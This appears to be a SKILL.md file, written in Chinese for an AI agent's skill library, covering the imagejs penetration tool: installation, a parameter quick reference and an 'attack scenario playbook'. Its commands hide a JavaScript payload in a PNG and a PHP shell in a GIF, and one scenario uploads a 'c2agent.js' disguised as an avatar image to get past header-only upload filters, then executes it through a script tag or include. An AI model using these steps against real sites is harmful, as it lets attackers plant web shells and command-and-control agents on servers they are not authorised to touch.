---
name: imagejs-polyglot
description: 渗透工具 skill:imagejs 的安装、参数速查与攻击场景 playbook。当任务涉及 载荷与文件投递 需要调用 imagejs 时使用。
---

# imagejs

- 攻击大类:C07 载荷与文件投递
- 上游仓库:https://github.com/jklmnn/imagejs
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/jklmnn/imagejs && cd imagejs && make
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./imagejs -i payload.js -o exploit.png js` | JS 藏进 PNG polyglot |
| `./imagejs -i shell.php -o pic.gif php` | PHP 藏进 GIF |
| `-l` | 列出支持格式 |

## 攻击场景 Playbook

### 绕过图片上传白名单

```bash
./imagejs -i c2agent.js -o avatar.png js
# 上传头像 .png,配合 <script src=avatar.png> 或 include 执行
```

## 注意事项

构造图片+脚本 polyglot 文件,绕过仅校验文件头的上传过滤,投递 JS/PHP 载荷。
